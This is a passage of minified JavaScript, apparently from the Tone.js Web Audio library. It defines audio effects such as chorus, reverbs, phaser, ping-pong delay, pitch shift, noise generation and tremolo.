i=2*r/n-1;e[r]=0===i?0:this._getCoefficient(i,t,{})}this._shaper.curve=e}}),Object.defineProperty(t.Chebyshev.prototype,"oversample",{get:function(){return this._shaper.oversample},set:function(t){this._shaper.oversample=t}}),t.Chebyshev.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._shaper.dispose(),this._shaper=null,this},t.Chebyshev})),n((function(t){return t.StereoEffect=function(){t.AudioNode.call(this);var e=t.defaults(arguments,["wet"],t.Effect);this.createInsOuts(1,1),this._dryWet=new t.CrossFade(e.wet),this.wet=this._dryWet.fade,this._split=new t.Split,this.effectSendL=this._split.left,this.effectSendR=this._split.right,this._merge=new t.Merge,this.effectReturnL=this._merge.left,this.effectReturnR=this._merge.right,this.input.connect(this._split),this.input.connect(this._dryWet,0,0),this._merge.connect(this._dryWet,0,1),this._dryWet.connect(this.output),this._readOnly(["wet"])},t.extend(t.StereoEffect,t.Effect),t.StereoEffect.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._dryWet.dispose(),this._dryWet=null,this._split.dispose(),this._split=null,this._merge.dispose(),this._merge=null,this.effectSendL=null,this.effectSendR=null,this.effectReturnL=null,this.effectReturnR=null,this._writable(["wet"]),this.wet=null,this},t.StereoEffect})),n((function(t){return t.Chorus=function(){var e=t.defaults(arguments,["frequency","delayTime","depth"],t.Chorus);t.StereoEffect.call(this,e),this._depth=e.depth,this._delayTime=e.delayTime/1e3,this._lfoL=new t.LFO({frequency:e.frequency,min:0,max:1}),this._lfoR=new t.LFO({frequency:e.frequency,min:0,max:1,phase:180}),this._delayNodeL=new t.Delay,this._delayNodeR=new t.Delay,this.frequency=this._lfoL.frequency,this.effectSendL.chain(this._delayNodeL,this.effectReturnL),this.effectSendR.chain(this._delayNodeR,this.effectReturnR),this.effectSendL.connect(this.effectReturnL),this.effectSendR.connect(this.effectReturnR),this._lfoL.connect(this._delayNodeL.delayTime),this._lfoR.connect(this._delayNodeR.delayTime),this._lfoL.start(),this._lfoR.start(),this._lfoL.frequency.connect(this._lfoR.frequency),this.depth=this._depth,this.frequency.value=e.frequency,this.type=e.type,this._readOnly(["frequency"]),this.spread=e.spread},t.extend(t.Chorus,t.StereoEffect),t.Chorus.defaults={frequency:1.5,delayTime:3.5,depth:.7,type:"sine",spread:180},Object.defineProperty(t.Chorus.prototype,"depth",{get:function(){return this._depth},set:function(t){this._depth=t;var e=this._delayTime*t;this._lfoL.min=Math.max(this._delayTime-e,0),this._lfoL.max=this._delayTime+e,this._lfoR.min=Math.max(this._delayTime-e,0),this._lfoR.max=this._delayTime+e}}),Object.defineProperty(t.Chorus.prototype,"delayTime",{get:function(){return 1e3*this._delayTime},set:function(t){this._delayTime=t/1e3,this.depth=this._depth}}),Object.defineProperty(t.Chorus.prototype,"type",{get:function(){return this._lfoL.type},set:function(t){this._lfoL.type=t,this._lfoR.type=t}}),Object.defineProperty(t.Chorus.prototype,"spread",{get:function(){return this._lfoR.phase-this._lfoL.phase},set:function(t){this._lfoL.phase=90-t/2,this._lfoR.phase=t/2+90}}),t.Chorus.prototype.dispose=function(){return t.StereoEffect.prototype.dispose.call(this),this._lfoL.dispose(),this._lfoL=null,this._lfoR.dispose(),this._lfoR=null,this._delayNodeL.dispose(),this._delayNodeL=null,this._delayNodeR.dispose(),this._delayNodeR=null,this._writable("frequency"),this.frequency=null,this},t.Chorus})),n((function(t){return t.Convolver=function(){var e=t.defaults(arguments,["url","onload"],t.Convolver);t.Effect.call(this,e),this._convolver=this.context.createConvolver(),this._buffer=new t.Buffer(e.url,function(t){this._convolver.buffer=t.get(),e.onload()}.bind(this)),this.connectEffect(this._convolver)},t.extend(t.Convolver,t.Effect),t.Convolver.defaults={onload:t.noOp},Object.defineProperty(t.Convolver.prototype,"buffer",{get:function(){return this._buffer.get()},set:function(t){this._buffer.set(t),this._convolver.buffer=this._buffer.get()}}),t.Convolver.prototype.load=function(t,e){return this._buffer.load(t,function(t){this.buffer=t,e&&e()}.bind(this))},t.Convolver.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._convolver.disconnect(),this._convolver=null,this._buffer.dispose(),this._buffer=null,this},t.Convolver})),n((function(t){return t.Distortion=function(){var e=t.defaults(arguments,["distortion"],t.Distortion);t.Effect.call(this,e),this._shaper=new t.WaveShaper(4096),this._distortion=e.distortion,this.connectEffect(this._shaper),this.distortion=e.distortion,this.oversample=e.oversample},t.extend(t.Distortion,t.Effect),t.Distortion.defaults={distortion:.4,oversample:"none"},Object.defineProperty(t.Distortion.prototype,"distortion",{get:function(){return this._distortion},set:function(t){this._distortion=t;var e=100*t,n=Math.PI/180;this._shaper.setMap((function(t){return Math.abs(t)<.001?0:(3+e)*t*20*n/(Math.PI+e*Math.abs(t))}))}}),Object.defineProperty(t.Distortion.prototype,"oversample",{get:function(){return this._shaper.oversample},set:function(t){this._shaper.oversample=t}}),t.Distortion.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._shaper.dispose(),this._shaper=null,this},t.Distortion})),n((function(t){return t.FeedbackEffect=function(){var e=t.defaults(arguments,["feedback"],t.FeedbackEffect);t.Effect.call(this,e),this._feedbackGain=new t.Gain(e.feedback,t.Type.NormalRange),this.feedback=this._feedbackGain.gain,this.effectReturn.chain(this._feedbackGain,this.effectSend),this._readOnly(["feedback"])},t.extend(t.FeedbackEffect,t.Effect),t.FeedbackEffect.defaults={feedback:.125},t.FeedbackEffect.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._writable(["feedback"]),this._feedbackGain.dispose(),this._feedbackGain=null,this.feedback=null,this},t.FeedbackEffect})),n((function(t){return t.FeedbackDelay=function(){var e=t.defaults(arguments,["delayTime","feedback"],t.FeedbackDelay);t.FeedbackEffect.call(this,e),this._delayNode=new t.Delay(e.delayTime,e.maxDelay),this.delayTime=this._delayNode.delayTime,this.connectEffect(this._delayNode),this._readOnly(["delayTime"])},t.extend(t.FeedbackDelay,t.FeedbackEffect),t.FeedbackDelay.defaults={delayTime:.25,maxDelay:1},t.FeedbackDelay.prototype.dispose=function(){return t.FeedbackEffect.prototype.dispose.call(this),this._delayNode.dispose(),this._delayNode=null,this._writable(["delayTime"]),this.delayTime=null,this},t.FeedbackDelay})),n((function(t){var e=[1557/44100,1617/44100,1491/44100,1422/44100,1277/44100,1356/44100,1188/44100,1116/44100],n=[225,556,441,341];return t.Freeverb=function(){var r=t.defaults(arguments,["roomSize","dampening"],t.Freeverb);t.StereoEffect.call(this,r),this.roomSize=new t.Signal(r.roomSize,t.Type.NormalRange),this.dampening=new t.Signal(r.dampening,t.Type.Frequency),this._combFilters=[],this._allpassFiltersL=[],this._allpassFiltersR=[];for(var i=0;i<n.length;i++){var o=this.context.createBiquadFilter();o.type="allpass",o.frequency.value=n[i],this._allpassFiltersL.push(o)}for(var s=0;s<n.length;s++){var a=this.context.createBiquadFilter();a.type="allpass",a.frequency.value=n[s],this._allpassFiltersR.push(a)}for(var u=0;u<e.length;u++){var c=new t.LowpassCombFilter(e[u]);u<e.length/2?this.effectSendL.chain(c,this._allpassFiltersL[0]):this.effectSendR.chain(c,this._allpassFiltersR[0]),this.roomSize.connect(c.resonance),this.dampening.connect(c.dampening),this._combFilters.push(c)}t.connectSeries.apply(t,this._allpassFiltersL),t.connectSeries.apply(t,this._allpassFiltersR),this._allpassFiltersL[this._allpassFiltersL.length-1].connect(this.effectReturnL),this._allpassFiltersR[this._allpassFiltersR.length-1].connect(this.effectReturnR),this._readOnly(["roomSize","dampening"])},t.extend(t.Freeverb,t.StereoEffect),t.Freeverb.defaults={roomSize:.7,dampening:3e3},t.Freeverb.prototype.dispose=function(){t.StereoEffect.prototype.dispose.call(this);for(var e=0;e<this._allpassFiltersL.length;e++)this._allpassFiltersL[e].disconnect(),this._allpassFiltersL[e]=null;this._allpassFiltersL=null;for(var n=0;n<this._allpassFiltersR.length;n++)this._allpassFiltersR[n].disconnect(),this._allpassFiltersR[n]=null;this._allpassFiltersR=null;for(var r=0;r<this._combFilters.length;r++)this._combFilters[r].dispose(),this._combFilters[r]=null;return this._combFilters=null,this._writable(["roomSize","dampening"]),this.roomSize.dispose(),this.roomSize=null,this.dampening.dispose(),this.dampening=null,this},t.Freeverb})),n((function(t){var e=[.06748,.06404,.08212,.09004],n=[.773,.802,.753,.733],r=[347,113,37];return t.JCReverb=function(){var i=t.defaults(arguments,["roomSize"],t.JCReverb);t.StereoEffect.call(this,i),this.roomSize=new t.Signal(i.roomSize,t.Type.NormalRange),this._scaleRoomSize=new t.Scale(-.733,.197),this._allpassFilters=[],this._feedbackCombFilters=[];for(var o=0;o<r.length;o++){var s=this.context.createBiquadFilter();s.type="allpass",s.frequency.value=r[o],this._allpassFilters.push(s)}for(var a=0;a<e.length;a++){var u=new t.FeedbackCombFilter(e[a],.1);this._scaleRoomSize.connect(u.resonance),u.resonance.value=n[a],this._allpassFilters[this._allpassFilters.length-1].connect(u),a<e.length/2?u.connect(this.effectReturnL):u.connect(this.effectReturnR),this._feedbackCombFilters.push(u)}this.roomSize.connect(this._scaleRoomSize),t.connectSeries.apply(t,this._allpassFilters),this.effectSendL.connect(this._allpassFilters[0]),this.effectSendR.connect(this._allpassFilters[0]),this._readOnly(["roomSize"])},t.extend(t.JCReverb,t.StereoEffect),t.JCReverb.defaults={roomSize:.5},t.JCReverb.prototype.dispose=function(){t.StereoEffect.prototype.dispose.call(this);for(var e=0;e<this._allpassFilters.length;e++)this._allpassFilters[e].disconnect(),this._allpassFilters[e]=null;this._allpassFilters=null;for(var n=0;n<this._feedbackCombFilters.length;n++)this._feedbackCombFilters[n].dispose(),this._feedbackCombFilters[n]=null;return this._feedbackCombFilters=null,this._writable(["roomSize"]),this.roomSize.dispose(),this.roomSize=null,this._scaleRoomSize.dispose(),this._scaleRoomSize=null,this},t.JCReverb})),n((function(t){return t.MidSideEffect=function(){t.Effect.apply(this,arguments),this._midSideSplit=new t.MidSideSplit,this._midSideMerge=new t.MidSideMerge,this.midSend=this._midSideSplit.mid,this.sideSend=this._midSideSplit.side,this.midReturn=this._midSideMerge.mid,this.sideReturn=this._midSideMerge.side,this.effectSend.connect(this._midSideSplit),this._midSideMerge.connect(this.effectReturn)},t.extend(t.MidSideEffect,t.Effect),t.MidSideEffect.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._midSideSplit.dispose(),this._midSideSplit=null,this._midSideMerge.dispose(),this._midSideMerge=null,this.midSend=null,this.sideSend=null,this.midReturn=null,this.sideReturn=null,this},t.MidSideEffect})),n((function(t){return t.Phaser=function(){var e=t.defaults(arguments,["frequency","octaves","baseFrequency"],t.Phaser);t.StereoEffect.call(this,e),this._lfoL=new t.LFO(e.frequency,0,1),this._lfoR=new t.LFO(e.frequency,0,1),this._lfoR.phase=180,this._baseFrequency=e.baseFrequency,this._octaves=e.octaves,this.Q=new t.Signal(e.Q,t.Type.Positive),this._filtersL=this._makeFilters(e.stages,this._lfoL,this.Q),this._filtersR=this._makeFilters(e.stages,this._lfoR,this.Q),this.frequency=this._lfoL.frequency,this.frequency.value=e.frequency,this.effectSendL.connect(this._filtersL[0]),this.effectSendR.connect(this._filtersR[0]),this._filtersL[e.stages-1].connect(this.effectReturnL),this._filtersR[e.stages-1].connect(this.effectReturnR),this._lfoL.frequency.connect(this._lfoR.frequency),this.baseFrequency=e.baseFrequency,this.octaves=e.octaves,this._lfoL.start(),this._lfoR.start(),this._readOnly(["frequency","Q"])},t.extend(t.Phaser,t.StereoEffect),t.Phaser.defaults={frequency:.5,octaves:3,stages:10,Q:10,baseFrequency:350},t.Phaser.prototype._makeFilters=function(e,n,r){for(var i=new Array(e),o=0;o<e;o++){var s=this.context.createBiquadFilter();s.type="allpass",r.connect(s.Q),n.connect(s.frequency),i[o]=s}return t.connectSeries.apply(t,i),i},Object.defineProperty(t.Phaser.prototype,"octaves",{get:function(){return this._octaves},set:function(t){this._octaves=t;var e=this._baseFrequency*Math.pow(2,t);this._lfoL.max=e,this._lfoR.max=e}}),Object.defineProperty(t.Phaser.prototype,"baseFrequency",{get:function(){return this._baseFrequency},set:function(t){this._baseFrequency=t,this._lfoL.min=t,this._lfoR.min=t,this.octaves=this._octaves}}),t.Phaser.prototype.dispose=function(){t.StereoEffect.prototype.dispose.call(this),this._writable(["frequency","Q"]),this.Q.dispose(),this.Q=null,this._lfoL.dispose(),this._lfoL=null,this._lfoR.dispose(),this._lfoR=null;for(var e=0;e<this._filtersL.length;e++)this._filtersL[e].disconnect(),this._filtersL[e]=null;this._filtersL=null;for(var n=0;n<this._filtersR.length;n++)this._filtersR[n].disconnect(),this._filtersR[n]=null;return this._filtersR=null,this.frequency=null,this},t.Phaser})),n((function(t){return t.StereoXFeedbackEffect=function(){var e=t.defaults(arguments,["feedback"],t.FeedbackEffect);t.StereoEffect.call(this,e),this.feedback=new t.Signal(e.feedback,t.Type.NormalRange),this._feedbackLR=new t.Gain,this._feedbackRL=new t.Gain,this.effectReturnL.chain(this._feedbackLR,this.effectSendR),this.effectReturnR.chain(this._feedbackRL,this.effectSendL),this.feedback.fan(this._feedbackLR.gain,this._feedbackRL.gain),this._readOnly(["feedback"])},t.extend(t.StereoXFeedbackEffect,t.StereoEffect),t.StereoXFeedbackEffect.prototype.dispose=function(){return t.StereoEffect.prototype.dispose.call(this),this._writable(["feedback"]),this.feedback.dispose(),this.feedback=null,this._feedbackLR.dispose(),this._feedbackLR=null,this._feedbackRL.dispose(),this._feedbackRL=null,this},t.StereoXFeedbackEffect})),n((function(t){return t.PingPongDelay=function(){var e=t.defaults(arguments,["delayTime","feedback"],t.PingPongDelay);t.StereoXFeedbackEffect.call(this,e),this._leftDelay=new t.Delay(0,e.maxDelayTime),this._rightDelay=new t.Delay(0,e.maxDelayTime),this._rightPreDelay=new t.Delay(0,e.maxDelayTime),this.delayTime=new t.Signal(e.delayTime,t.Type.Time),this.effectSendL.chain(this._leftDelay,this.effectReturnL),this.effectSendR.chain(this._rightPreDelay,this._rightDelay,this.effectReturnR),this.delayTime.fan(this._leftDelay.delayTime,this._rightDelay.delayTime,this._rightPreDelay.delayTime),this._feedbackLR.disconnect(),this._feedbackLR.connect(this._rightDelay),this._readOnly(["delayTime"])},t.extend(t.PingPongDelay,t.StereoXFeedbackEffect),t.PingPongDelay.defaults={delayTime:.25,maxDelayTime:1},t.PingPongDelay.prototype.dispose=function(){return t.StereoXFeedbackEffect.prototype.dispose.call(this),this._leftDelay.dispose(),this._leftDelay=null,this._rightDelay.dispose(),this._rightDelay=null,this._rightPreDelay.dispose(),this._rightPreDelay=null,this._writable(["delayTime"]),this.delayTime.dispose(),this.delayTime=null,this},t.PingPongDelay})),n((function(t){return t.PitchShift=function(){var e=t.defaults(arguments,["pitch"],t.PitchShift);t.FeedbackEffect.call(this,e),this._frequency=new t.Signal(0),this._delayA=new t.Delay(0,1),this._lfoA=new t.LFO({min:0,max:.1,type:"sawtooth"}).connect(this._delayA.delayTime),this._delayB=new t.Delay(0,1),this._lfoB=new t.LFO({min:0,max:.1,type:"sawtooth",phase:180}).connect(this._delayB.delayTime),this._crossFade=new t.CrossFade,this._crossFadeLFO=new t.LFO({min:0,max:1,type:"triangle",phase:90}).connect(this._crossFade.fade),this._feedbackDelay=new t.Delay(e.delayTime),this.delayTime=this._feedbackDelay.delayTime,this._readOnly("delayTime"),this._pitch=e.pitch,this._windowSize=e.windowSize,this._delayA.connect(this._crossFade.a),this._delayB.connect(this._crossFade.b),this._frequency.fan(this._lfoA.frequency,this._lfoB.frequency,this._crossFadeLFO.frequency),this.effectSend.fan(this._delayA,this._delayB),this._crossFade.chain(this._feedbackDelay,this.effectReturn);var n=this.now();this._lfoA.start(n),this._lfoB.start(n),this._crossFadeLFO.start(n),this.windowSize=this._windowSize},t.extend(t.PitchShift,t.FeedbackEffect),t.PitchShift.defaults={pitch:0,windowSize:.1,delayTime:0,feedback:0},Object.defineProperty(t.PitchShift.prototype,"pitch",{get:function(){return this._pitch},set:function(e){this._pitch=e;var n=0;e<0?(this._lfoA.min=0,this._lfoA.max=this._windowSize,this._lfoB.min=0,this._lfoB.max=this._windowSize,n=t.intervalToFrequencyRatio(e-1)+1):(this._lfoA.min=this._windowSize,this._lfoA.max=0,this._lfoB.min=this._windowSize,this._lfoB.max=0,n=t.intervalToFrequencyRatio(e)-1),this._frequency.value=n*(1.2/this._windowSize)}}),Object.defineProperty(t.PitchShift.prototype,"windowSize",{get:function(){return this._windowSize},set:function(t){this._windowSize=this.toSeconds(t),this.pitch=this._pitch}}),t.PitchShift.prototype.dispose=function(){return t.FeedbackEffect.prototype.dispose.call(this),this._frequency.dispose(),this._frequency=null,this._delayA.disconnect(),this._delayA=null,this._delayB.disconnect(),this._delayB=null,this._lfoA.dispose(),this._lfoA=null,this._lfoB.dispose(),this._lfoB=null,this._crossFade.dispose(),this._crossFade=null,this._crossFadeLFO.dispose(),this._crossFadeLFO=null,this._writable("delayTime"),this._feedbackDelay.dispose(),this._feedbackDelay=null,this.delayTime=null,this},t.PitchShift})),n((function(t){return t.BufferSource=function(){var e=t.defaults(arguments,["buffer","onload"],t.BufferSource);t.AudioNode.call(this,e),this.onended=e.onended,this._startTime=-1,this._sourceStarted=!1,this._sourceStopped=!1,this._stopTime=-1,this._gainNode=this.output=new t.Gain,this._source=this.context.createBufferSource(),this._source.connect(this._gainNode),this._source.onended=this._onended.bind(this),this._buffer=new t.Buffer(e.buffer,e.onload),this.playbackRate=new t.Param(this._source.playbackRate,t.Type.Positive),this.fadeIn=e.fadeIn,this.fadeOut=e.fadeOut,this.curve=e.curve,this._gain=1,this._onendedTimeout=-1,this.loop=e.loop,this.loopStart=e.loopStart,this.loopEnd=e.loopEnd,this.playbackRate.value=e.playbackRate},t.extend(t.BufferSource,t.AudioNode),t.BufferSource.defaults={onended:t.noOp,onload:t.noOp,loop:!1,loopStart:0,loopEnd:0,fadeIn:0,fadeOut:0,curve:"linear",playbackRate:1},Object.defineProperty(t.BufferSource.prototype,"state",{get:function(){return this.getStateAtTime(this.now())}}),t.BufferSource.prototype.getStateAtTime=function(e){return e=this.toSeconds(e),-1!==this._startTime&&e>=this._startTime&&!this._sourceStopped?t.State.Started:t.State.Stopped},t.BufferSource.prototype.start=function(e,n,r,i,o){if(-1!==this._startTime)throw new Error("Tone.BufferSource can only be started once.");if(!this.buffer.loaded)throw new Error("Tone.BufferSource: buffer is either not set or not loaded.");e=this.toSeconds(e),n=this.loop?t.defaultArg(n,this.loopStart):t.defaultArg(n,0),n=this.toSeconds(n),i=t.defaultArg(i,1),this._gain=i,o=this.toSeconds(t.defaultArg(o,this.fadeIn)),this.fadeIn=o,o>0?(this._gainNode.gain.setValueAtTime(0,e),"linear"===this.curve?this._gainNode.gain.linearRampToValueAtTime(this._gain,e+o):this._gainNode.gain.exponentialApproachValueAtTime(this._gain,e,o)):this._gainNode.gain.setValueAtTime(i,e),this._startTime=e;var s=this.toSeconds(t.defaultArg(r,this.buffer.duration-n%this.buffer.duration));if(s=Math.max(s,0),t.isDefined(r)&&(this.loop||(s=Math.min(s,this.buffer.duration-n%this.buffer.duration)),this.stop(e+s,this.fadeOut)),this.loop){var a=this.loopEnd||this.buffer.duration,u=this.loopStart;n>=a&&(n=(n-u)%(a-u)+u)}return this._source.buffer=this.buffer.get(),this._source.loopEnd=this.loopEnd||this.buffer.duration,n<this.buffer.duration&&(this._sourceStarted=!0,this._source.start(e,n)),this},t.BufferSource.prototype.stop=function(e,n){if(!this.buffer.loaded)throw new Error("Tone.BufferSource: buffer is either not set or not loaded.");if(!this._sourceStopped){if(e=this.toSeconds(e),-1!==this._stopTime&&this.cancelStop(),e<=this._startTime)return this._gainNode.gain.cancelScheduledValues(e),this._gainNode.gain.value=0,this;e=Math.max(this._startTime+this.fadeIn+this.sampleTime,e),this._gainNode.gain.cancelScheduledValues(e),this._stopTime=e,n=this.toSeconds(t.defaultArg(n,this.fadeOut));var r=e-this._startTime-this.fadeIn-this.sampleTime;this.loop||(r=Math.min(r,this.buffer.duration));var i=e-(n=Math.min(r,n));return n>this.sampleTime?(this._gainNode.gain.setValueAtTime(this._gain,i),"linear"===this.curve?this._gainNode.gain.linearRampToValueAtTime(0,e):this._gainNode.gain.exponentialApproachValueAtTime(0,i,n)):this._gainNode.gain.setValueAtTime(0,e),t.context.clearTimeout(this._onendedTimeout),this._onendedTimeout=t.context.setTimeout(this._onended.bind(this),this._stopTime-this.now()),this}},t.BufferSource.prototype.cancelStop=function(){if(-1!==this._startTime&&!this._sourceStopped){var t=this.toSeconds(this.fadeIn);this._gainNode.gain.cancelScheduledValues(this._startTime+t+this.sampleTime),this._gainNode.gain.setValueAtTime(1,Math.max(this.now(),this._startTime+t+this.sampleTime)),this.context.clearTimeout(this._onendedTimeout),this._stopTime=-1}return this},t.BufferSource.prototype._onended=function(){if(!this._sourceStopped){this._sourceStopped=!0;var t="exponential"===this.curve?2*this.fadeOut:0;this._sourceStarted&&-1!==this._stopTime&&this._source.stop(this._stopTime+t),this.onended(this)}},Object.defineProperty(t.BufferSource.prototype,"loopStart",{get:function(){return this._source.loopStart},set:function(t){this._source.loopStart=this.toSeconds(t)}}),Object.defineProperty(t.BufferSource.prototype,"loopEnd",{get:function(){return this._source.loopEnd},set:function(t){this._source.loopEnd=this.toSeconds(t)}}),Object.defineProperty(t.BufferSource.prototype,"buffer",{get:function(){return this._buffer},set:function(t){this._buffer.set(t)}}),Object.defineProperty(t.BufferSource.prototype,"loop",{get:function(){return this._source.loop},set:function(t){this._source.loop=t,this.cancelStop()}}),t.BufferSource.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this.onended=null,this._source.onended=null,this._source.disconnect(),this._source=null,this._gainNode.dispose(),this._gainNode=null,this._buffer.dispose(),this._buffer=null,this._startTime=-1,this.playbackRate=null,t.context.clearTimeout(this._onendedTimeout),this},t.BufferSource})),n((function(t){t.Noise=function(){var e=t.defaults(arguments,["type"],t.Noise);t.Source.call(this,e),this._source=null,this._type=e.type,this._playbackRate=e.playbackRate},t.extend(t.Noise,t.Source),t.Noise.defaults={type:"white",playbackRate:1},Object.defineProperty(t.Noise.prototype,"type",{get:function(){return this._type},set:function(e){if(this._type!==e){if(!(e in r))throw new TypeError("Tone.Noise: invalid type: "+e);if(this._type=e,this.state===t.State.Started){var n=this.now();this._stop(n),this._start(n)}}}}),Object.defineProperty(t.Noise.prototype,"playbackRate",{get:function(){return this._playbackRate},set:function(t){this._playbackRate=t,this._source&&(this._source.playbackRate.value=t)}}),t.Noise.prototype._start=function(e){var n=r[this._type];this._source=new t.BufferSource(n).connect(this.output),this._source.loop=!0,this._source.playbackRate.value=this._playbackRate,this._source.start(this.toSeconds(e),Math.random()*(n.duration-.001))},t.Noise.prototype._stop=function(t){this._source&&(this._source.stop(this.toSeconds(t)),this._source=null)},t.Noise.prototype.restart=function(t){this._stop(t),this._start(t)},t.Noise.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),null!==this._source&&(this._source.disconnect(),this._source=null),this._buffer=null,this};var e=220500,n={pink:function(){for(var t=[],n=0;n<2;n++){var r,i,o,s,a,u,c,l=new Float32Array(e);t[n]=l,r=i=o=s=a=u=c=0;for(var h=0;h<e;h++){var p=2*Math.random()-1;r=.99886*r+.0555179*p,i=.99332*i+.0750759*p,o=.969*o+.153852*p,s=.8665*s+.3104856*p,a=.55*a+.5329522*p,u=-.7616*u-.016898*p,l[h]=r+i+o+s+a+u+c+.5362*p,l[h]*=.11,c=.115926*p}}return t}(),brown:function(){for(var t=[],n=0;n<2;n++){var r=new Float32Array(e);t[n]=r;for(var i=0,o=0;o<e;o++){var s=2*Math.random()-1;r[o]=(i+.02*s)/1.02,i=r[o],r[o]*=3.5}}return t}(),white:function(){for(var t=[],n=0;n<2;n++){var r=new Float32Array(e);t[n]=r;for(var i=0;i<e;i++)r[i]=2*Math.random()-1}return t}()},r={};function i(){for(var e in n)r[e]=(new t.Buffer).fromArray(n[e])}return t.getContext(i),t.Context.on("init",i),t.Noise})),n((function(t){return t.Reverb=function(){var e=t.defaults(arguments,["decay"],t.Reverb);t.Effect.call(this,e),this._convolver=this.context.createConvolver(),this.decay=e.decay,this.preDelay=e.preDelay,this.connectEffect(this._convolver)},t.extend(t.Reverb,t.Effect),t.Reverb.defaults={decay:1.5,preDelay:.01},t.Reverb.prototype.generate=function(){return t.Offline(function(){var e=new t.Noise,n=new t.Noise,r=new t.Merge;e.connect(r.left),n.connect(r.right);var i=(new t.Gain).toMaster();r.connect(i),e.start(0),n.start(0),i.gain.setValueAtTime(0,0),i.gain.linearRampToValueAtTime(1,this.preDelay),i.gain.exponentialApproachValueAtTime(0,this.preDelay,this.decay-this.preDelay)}.bind(this),this.decay).then(function(t){return this._convolver.buffer=t.get(),this}.bind(this))},t.Reverb.prototype.dispose=function(){return t.Effect.prototype.dispose.call(this),this._convolver.disconnect(),this._convolver=null,this},t.Reverb})),n((function(t){return t.StereoFeedbackEffect=function(){var e=t.defaults(arguments,["feedback"],t.FeedbackEffect);t.StereoEffect.call(this,e),this.feedback=new t.Signal(e.feedback,t.Type.NormalRange),this._feedbackL=new t.Gain,this._feedbackR=new t.Gain,this.effectReturnL.chain(this._feedbackL,this.effectSendL),this.effectReturnR.chain(this._feedbackR,this.effectSendR),this.feedback.fan(this._feedbackL.gain,this._feedbackR.gain),this._readOnly(["feedback"])},t.extend(t.StereoFeedbackEffect,t.StereoEffect),t.StereoFeedbackEffect.prototype.dispose=function(){return t.StereoEffect.prototype.dispose.call(this),this._writable(["feedback"]),this.feedback.dispose(),this.feedback=null,this._feedbackL.dispose(),this._feedbackL=null,this._feedbackR.dispose(),this._feedbackR=null,this},t.StereoFeedbackEffect})),n((function(t){return t.StereoWidener=function(){var e=t.defaults(arguments,["width"],t.StereoWidener);t.MidSideEffect.call(this,e),this.width=new t.Signal(e.width,t.Type.NormalRange),this._readOnly(["width"]),this._twoTimesWidthMid=new t.Multiply(2),this._twoTimesWidthSide=new t.Multiply(2),this._midMult=new t.Multiply,this._twoTimesWidthMid.connect(this._midMult,0,1),this.midSend.chain(this._midMult,this.midReturn),this._oneMinusWidth=new t.Subtract,this._oneMinusWidth.connect(this._twoTimesWidthMid),this.context.getConstant(1).connect(this._oneMinusWidth,0,0),this.width.connect(this._oneMinusWidth,0,1),this._sideMult=new t.Multiply,this.width.connect(this._twoTimesWidthSide),this._twoTimesWidthSide.connect(this._sideMult,0,1),this.sideSend.chain(this._sideMult,this.sideReturn)},t.extend(t.StereoWidener,t.MidSideEffect),t.StereoWidener.defaults={width:.5},t.StereoWidener.prototype.dispose=function(){return t.MidSideEffect.prototype.dispose.call(this),this._writable(["width"]),this.width.dispose(),this.width=null,this._midMult.dispose(),this._midMult=null,this._sideMult.dispose(),this._sideMult=null,this._twoTimesWidthMid.dispose(),this._twoTimesWidthMid=null,this._twoTimesWidthSide.dispose(),this._twoTimesWidthSide=null,this._oneMinusWidth.dispose(),this._oneMinusWidth=null,this},t.StereoWidener})),n((function(t){return t.Tremolo=function(){var e=t.defaults(arguments,["frequency","depth"],t.Tremolo);t.StereoEffect.call(this,e),this._lfoL=new t.LFO({phase:e.spread,min:1,max:0}),this._lfoR=new t.LFO({phase:e.spread,min:1,max:0}),this._amplitudeL=new t.Gain,this._amplitudeR=new t.Gain,this.frequency=new t.Signal(e.frequency,t.Type.Frequency),this.depth=new t.Signal(e.depth,t.Type.NormalRange),this._readOnly(["frequency","depth"]),this.effectSendL.chain(this._amplitudeL,this.effectReturnL),this.effectSendR.chain(this._amplitudeR,this.effectReturnR),this._lfoL.connect(this._amplitudeL.gain),this._lfoR.connect(this._amplitudeR.gain),this.frequency.fan(this._lfoL.frequency,this._lfoR.frequency),this.depth.fan(this._lfoR.amplitude,this._lfoL.amplitude),this.type=e.type,this.spread=e.spread},t.extend(t.Tremolo,t.StereoEffect),t.Tremolo.defaults={frequency:10,type:"sine",depth:.5,spread:180},t.Tremolo.prototype.start=function(t){return this._lfoL.start(t),this._lfoR.start(t),this},t.Tremolo.prototype.stop=function(t){return this._lfoL.stop(t),this._lfoR.stop(t),this},t.Tremolo.prototype.sync=function(e){return this._lfoL.sync(e),this._lfoR.sync(e),t.Transport.syncSignal(this.frequency),this},t.Tremolo.prototype.unsync=function(){return this._lfoL.unsync(),this._lfoR.unsync(),t.Transport.unsyncSignal(this.frequency),this},Object.defineProperty(t.Tremolo.prototype,"type",{get:function(){return this._lfoL.type},set:function(t){this._lfoL.type=t,this._lfoR.type=t}}),Object.defineProperty(t.Tremolo.prototype,"spread",{get:function(){return this._lfoR.phase-this._lfoL.phase},set:function(t){this._lfoL.phase=90-t/2,this._lfoR.phase=t/2+90}}),t.Tremolo.prototype.dispose=function(){return t.StereoEffect.prototype.dispose.call(this),this._writable(["frequency","depth"]),this._lfoL.dispose(),this._lfoL=null,this._lfoR.dispose(),this._lfoR=null,this._amplitudeL.dispose(),this._amplitudeL=null,this._amplitudeR.dispose(),this._amplitudeR=null,this.frequency=null,this.depth=null,this},t.Tremolo})),n((function(t){return t.Vibrato=function(){var e=t.defaults(arguments,["frequency","depth"],t.Vibrato);t.Effect.call(this,e),this._delayNode=new t.Delay(0,e.maxDelay),this._lfo=new t.LFO({type:e.type,min:0,max:e.maxDelay,frequency:e.frequency,phase:-90}).start().connect(this._delayNode.delayTime),this.frequency=this._lfo.frequency,this.depth=this._lfo.amplitude,this.depth.value=e.depth,this._readOnly(["frequency","depth"]),this.effectSend.chain(this._delayNode,this.effectReturn)},t.extend(t.Vibrato,t.Effect),t.Vibrato.defaults={maxDelay:.005,frequency:5,depth:.1,type:"sine"},Object.defineProperty(t.Vibrato.prototype,"type",{get:function(){return 